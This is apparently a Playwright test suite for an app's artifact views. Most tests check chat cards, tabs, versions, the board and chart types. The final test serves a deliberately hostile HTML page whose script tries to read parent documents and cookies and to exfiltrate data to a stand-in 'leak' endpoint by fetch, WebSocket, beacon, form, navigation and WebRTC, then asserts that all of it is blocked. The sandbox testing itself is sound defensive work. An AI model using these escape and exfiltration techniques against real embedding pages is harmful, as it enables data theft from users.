import { readFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";

import type { Page } from "@playwright/test";

import { expect, mockOnly, test } from "./fixtures";

// In-app artifacts (components/art): what the search-perf agent made with
// berthd artifact add, as cards in its chat, tabs, splits and the board,
// live when a version lands (window.__art.bump, lib/art/mock-artifacts.ts).
// The last test runs a hostile page on its own origin, served with the
// laptop proxy's exact headers and documents (src/lib/art/origin.gen.json,
// which the Go suite keeps equal to internal/proxy/artifact.go), and checks
// it can't reach the app, the laptop agent or the network.

const P95 = "d2e8f1a0b3";
const PAGE = "f9b4c8d7e6";

const card = (page: Page, id: string) => page.locator(`[data-testid=pane]:visible [data-art-card="${id}"]`);
const artPane = (page: Page) => page.locator("[data-testid=pane][data-pane-kind=artifact]:visible");

async function openChat(app: { open(o?: object): Promise<void>; openWorktree(w: string): Promise<void> }, params: Record<string, string> = {}) {
  await app.open({ params: { view: "conversation", ...params } });
  await app.openWorktree("devl/search-perf");
}

test.beforeEach(() => mockOnly("drives the demo's artifacts"));

test("a card in the chat leads with the headline its data gives, and opens as a tab", async ({ app }) => {
  await openChat(app);
  const c = card(app.page, P95);
  await c.scrollIntoViewIfNeeded();
  await expect(c.locator("[data-art-title]")).toHaveText("p95 before and after");
  await expect(c.locator("[data-art-gist]")).toHaveText("/search 1,240 → 410 ms (−67%)");
  await expect(c).toContainText("Bar chart");
  await expect(c.locator("[data-art-version]")).toHaveText("v1");
  // Its thumbnail is the chart itself, drawn by bklit.
  await expect(c.locator("[data-art-size=thumb] svg rect").first()).toBeAttached();
  await c.getByRole("button", { name: "Open", exact: true }).click();
  const pane = artPane(app.page);
  await expect(pane).toHaveCount(1);
  await expect(app.panes).toHaveCount(1);
  await expect(pane.getByRole("heading", { name: "p95 before and after" })).toBeVisible();
  await expect(pane.locator("[data-chart-type=bar]")).toBeVisible();
  await expect(pane.getByLabel("Changes")).toContainText("/search−67%");
  await expect(app.page.locator("[data-tab-strip] [data-tab][aria-selected=true]")).toContainText("p95 before and after");
});

test("⌘-click opens it beside the chat; opening it again brings that pane forward", async ({ app }) => {
  await openChat(app);
  const c = card(app.page, P95);
  await c.scrollIntoViewIfNeeded();
  await c.getByRole("button", { name: `Open p95 before and after`, exact: true }).click({ modifiers: ["ControlOrMeta"] });
  await expect(app.panes).toHaveCount(2);
  await expect(artPane(app.page)).toHaveCount(1);
  await expect(app.chat).toBeVisible();
  // Again: no second pane.
  await c.getByRole("button", { name: "Open p95 before and after beside the chat" }).click();
  await expect(app.panes).toHaveCount(2);
});

test("a new version lands live: the pill pulses, the card says v2, and the versions strip steps back", async ({ app }) => {
  await openChat(app);
  const c = card(app.page, P95);
  await c.scrollIntoViewIfNeeded();
  await c.getByRole("button", { name: "Open p95 before and after beside the chat" }).click();
  const pane = artPane(app.page);
  await expect(pane.getByTestId("art-live")).toContainText("v1");
  await app.page.evaluate(() => (window as unknown as { __art: { bump(): Promise<void> } }).__art.bump());
  await expect(pane.getByTestId("art-live")).toHaveAttribute("data-pulse", "true");
  await expect(pane.getByTestId("art-live")).toContainText("Updated just now · v2");
  await expect(pane.locator("[data-art-gist]")).toHaveText("/search 1,240 → 180 ms (−85%)");
  // The chat: the card is v2, and the agent's update is a line of its own.
  await expect(card(app.page, P95).first().locator("[data-art-version]")).toHaveText("v2");
  await expect(app.chat.getByTestId("art-update")).toContainText("to v2");
  // Back to v1, and to the latest again.
  const strip = pane.getByTestId("art-versions");
  await expect(strip.getByRole("radio")).toHaveCount(2);
  await strip.getByRole("radio", { name: /v1/ }).click();
  await expect(pane.getByTestId("art-old")).toContainText("Showing v1");
  await expect(pane.locator("[data-art-gist]")).toHaveText("/search 1,240 → 180 ms (−85%)");
  await pane.getByRole("button", { name: "Back to latest" }).click();
  await expect(pane.getByTestId("art-old")).toHaveCount(0);
});

test("the source view shows what the agent wrote", async ({ app }) => {
  await openChat(app);
  const c = card(app.page, P95);
  await c.scrollIntoViewIfNeeded();
  await c.getByRole("button", { name: "Open", exact: true }).click();
  const pane = artPane(app.page);
  await pane.getByTestId("art-source-toggle").click();
  await expect(pane.getByTestId("art-source")).toContainText('"$schema": "berth.chart/v1"');
  await pane.getByTestId("art-source-toggle").click();
  await expect(pane.locator("[data-chart-type=bar]")).toBeVisible();
});

test("the board shows the worktree's artifacts, filters by kind, and opens one", async ({ app }) => {
  await openChat(app);
  await app.page.getByTestId("art-chip").click();
  const board = app.page.getByTestId("artifact-board");
  await expect(board).toBeVisible();
  await expect(board.locator("[data-art-tile]")).toHaveCount(13);
  for (const [kind, n] of [["chart", 9], ["table", 1], ["diagram", 1], ["page", 1], ["notes", 1]] as const) {
    await board.locator(`[data-filter=${kind}]`).click();
    await expect(board.locator("[data-art-tile]")).toHaveCount(n);
  }
  await board.locator("[data-filter=table]").click();
  await board.getByRole("button", { name: "Open Search test results", exact: true }).last().click();
  const pane = artPane(app.page).filter({ has: app.page.locator("[data-art-table]") });
  await expect(pane.locator("[data-art-gist]")).toHaveText("3 failed of 16 · 1 skipped");
  await pane.getByRole("button", { name: "Failures only" }).click();
  await expect(pane.locator("tbody tr")).toHaveCount(3);
  // The tab's Board button, and the toolbar's, come back to the board.
  await pane.getByTestId("art-board-link").click();
  await expect(app.page.getByTestId("artifact-board")).toBeVisible();
  await expect(app.page.getByTestId("art-board-button")).toContainText("13");
});

const TYPES: [string, string, string][] = [
  ["d2e8f1a0b3", "bar", "svg rect"],
  ["a3c7d9e1b2", "line", "svg path"],
  ["e0a9b8c7d6", "area", "svg path"],
  ["d6f7a8b9c0", "funnel", "svg"],
  ["b8d6e4f2a0", "sankey", "svg path"],
  ["c1e2f3a4b5", "gauge", "svg path"],
  ["f5e4d3c2b1", "pie", "svg path"],
  ["a0b1c2d3e5", "ring", "svg path"],
  ["b7c2a9e1f0", "heatmap", "[data-heatmap] td[data-level]"],
];

test("every chart type draws, and the other kinds too", async ({ app }) => {
  await openChat(app);
  await app.page.getByTestId("art-chip").click();
  for (const [id, type, mark] of TYPES) {
    await app.page.getByTestId("art-board-button").click();
    await app.page.locator(`[data-art-tile="${id}"]`).getByRole("button", { name: /^Open .*/ }).last().click();
    const pane = app.page.locator(`[data-testid=artifact-pane][data-art-id="${id}"]:visible`);
    await expect(pane.locator(`[data-chart-type=${type}]`)).toBeVisible();
    await expect(pane.locator(`[data-chart-type=${type}] ${mark}`).first()).toBeAttached();
  }
  const heat = app.page.locator('[data-testid=artifact-pane][data-art-id="b7c2a9e1f0"] [data-heatmap]');
  await expect(heat.locator("td[data-level]")).toHaveCount(72);
  // A diagram, notes and a page.
  for (const [id, sel] of [["a1f3c0d2e4", "[data-art-diagram] svg g.art-node-g"], ["c4d9e2b7a1", "[data-art-notes] ol li"], [PAGE, "iframe[data-art-frame]"]] as const) {
    await app.page.getByTestId("art-board-button").click();
    await app.page.locator(`[data-art-tile="${id}"]`).getByRole("button", { name: /^Open .*/ }).last().click();
    await expect(app.page.locator(`[data-testid=artifact-pane][data-art-id="${id}"]:visible ${sel}`).first()).toBeAttached();
  }
});

// The proxy, standing in: the art origin's shell and page with the exact
// policies and page head the Go proxy sends, and a record of anything that
// reaches it otherwise.
const ORIGIN = JSON.parse(readFileSync(new URL("../src/lib/art/origin.gen.json", import.meta.url), "utf8")) as { shellPolicy: string; pagePolicy: string; permissions: string; shellDoc: string; pageHead: string };

const HOSTILE = `<!doctype html><html><head><title>Totally fine</title><meta name="berth:summary" content="Totally fine"></head><body><h1>Reindex</h1>
<form id="f" method="POST" action="LEAK?form"><input name="x" value="secret"></form>
<script>
const out = {};
const tryIt = async (k, fn) => { try { const v = await fn(); out[k] = "ran:" + String(v).slice(0, 40); } catch (e) { out[k] = "blocked:" + e.name; } };
(async () => {
  await tryIt("parentDoc", () => window.parent.document.title);
  await tryIt("topDoc", () => window.top.document.body.innerHTML);
  await tryIt("cookie", () => document.cookie);
  await tryIt("storage", () => localStorage.setItem("x", "1"));
  await tryIt("fetch", () => fetch("LEAK?fetch"));
  await tryIt("agent", () => fetch("http://127.0.0.1:1378/v1/status"));
  await tryIt("xhr", () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.onerror = () => rej(new Error("xhr")); x.onload = res; x.open("GET", "LEAK?xhr"); x.send(); }));
  await tryIt("ws", () => new Promise((res, rej) => { const w = new WebSocket("WSLEAK"); w.onerror = () => rej(new Error("ws")); w.onopen = res; }));
  await tryIt("beacon", () => navigator.sendBeacon("LEAK?beacon", "x"));
  await tryIt("img", () => new Promise((res, rej) => { const i = new Image(); i.onload = res; i.onerror = () => rej(new Error("img")); i.src = "LEAK?img"; }));
  await tryIt("rtc", () => new RTCPeerConnection());
  // A fresh realm to get WebRTC back from: an about:blank frame.
  await tryIt("rtcFrame", () => { document.body.appendChild(document.createElement("iframe")); const W = window.frames[window.frames.length - 1]; return new W.RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:3478" }] }); });
  await tryIt("open", () => window.open("LEAK?open"));
  await tryIt("topNav", () => { window.top.location = "LEAK?top"; });
  await tryIt("form", () => document.getElementById("f").submit());
  try { window.top.postMessage({ berth: "devtools", id: "x", forged: true }, "*"); } catch {}
  document.body.dataset.results = JSON.stringify(out);
})();
</script></body></html>`;

function proxyStandIn(): Promise<{ server: Server; port: number; leaks: string[] }> {
  const leaks: string[] = [];
  const server = createServer((req, res) => {
    const host = req.headers.host ?? "";
    const url = new URL(req.url ?? "/", `http://${host}`);
    if (url.pathname.startsWith("/leak")) {
      leaks.push(`${req.method} ${url.search}`);
      res.writeHead(200, { "Content-Type": "text/plain" }).end("leaked");
      return;
    }
    const origin = `http://${host}`;
    const common = { "X-Content-Type-Options": "nosniff", "Referrer-Policy": "no-referrer", "Cache-Control": "no-store", "Permissions-Policy": ORIGIN.permissions };
    if (url.pathname === "/") {
      res.writeHead(200, { ...common, "Content-Type": "text/html; charset=utf-8", "Content-Security-Policy": ORIGIN.shellPolicy.replaceAll("http://ORIGIN", origin) });
      res.end(ORIGIN.shellDoc.replace('data-v="VERSION"', `data-v="${url.searchParams.get("v") ?? "latest"}"`));
      return;
    }
    if (url.pathname.startsWith("/v/")) {
      const leak = `http://127.0.0.1:${(server.address() as AddressInfo).port}/leak`;
      const body = HOSTILE.replaceAll("WSLEAK", leak.replace("http:", "ws:")).replaceAll("LEAK", leak).replace(/<head>/i, (m) => m + ORIGIN.pageHead);
      res.writeHead(200, { ...common, "Content-Type": "text/html; charset=utf-8", "Content-Security-Policy": ORIGIN.pagePolicy.replaceAll("http://ORIGIN", origin), "Cross-Origin-Opener-Policy": "same-origin" });
      res.end(body);
      return;
    }
    res.writeHead(404).end();
  });
  return new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve({ server, port: (server.address() as AddressInfo).port, leaks })));
}

test("a hostile page on its own origin can't reach the app, the laptop agent or the network", async ({ app }) => {
  const { server, port, leaks } = await proxyStandIn();
  try {
    await openChat(app, { artport: String(port) });
    const title = await app.page.title();
    const c = card(app.page, PAGE);
    await c.scrollIntoViewIfNeeded();
    await c.getByRole("button", { name: "Open", exact: true }).click();
    const frame = artPane(app.page).locator('iframe[data-art-frame="origin"]');
    await expect(frame).toHaveAttribute("src", new RegExp(`^http://art-${PAGE}\\.devl\\.localhost:${port}/\\?v=2#berth=`));
    // The page inside the shell ran and wrote what it managed.
    const inner = app.page.frameLocator('iframe[data-art-frame="origin"]').frameLocator("#page");
    await expect(inner.locator("body[data-results]")).toBeAttached();
    const results = JSON.parse((await inner.locator("body").getAttribute("data-results")) ?? "{}") as Record<string, string>;
    for (const k of ["parentDoc", "topDoc", "cookie", "storage", "fetch", "agent", "xhr", "ws", "img", "rtc", "rtcFrame"]) {
      expect(results[k], `${k}: ${results[k]}`).toMatch(/^blocked:/);
    }
    // A popup, a top navigation, a form or a beacon may say it tried
    // (the sandbox drops them quietly); nothing may arrive, and no window
    // may open.
    expect(results.open ?? "", "window.open").toMatch(/^(blocked:|ran:null)/);
    expect(app.page.context().pages()).toHaveLength(1);
    // Its theme came with it, from the fragment.
    await expect.poll(() => inner.locator("html").evaluate((el) => getComputedStyle(el).getPropertyValue("--berth-bg").trim())).not.toBe("");
    // Last, it navigates its own frame away with the data: the shell's
    // frame-src stops that (the frame shows an error page instead).
    const pageFrame = app.page.frames().find((f) => /\/v\/2/.test(f.url()));
    expect(pageFrame, "the page's frame").toBeTruthy();
    await pageFrame!.evaluate((u) => {
      location.href = u;
    }, `http://127.0.0.1:${port}/leak?nav`);
    // Give anything that got out time to land, then check nothing did.
    await app.page.waitForTimeout(1500);
    expect(leaks, "requests that reached the network").toEqual([]);
    expect(app.page.frames().some((f) => f.url().includes("/leak")), "a frame on the leak address").toBe(false);
    // And the app is as it was.
    expect(await app.page.title()).toBe(title);
    await expect(artPane(app.page).getByRole("heading", { name: "Reindex progress" })).toBeVisible();
  } finally {
    server.close();
  }
});
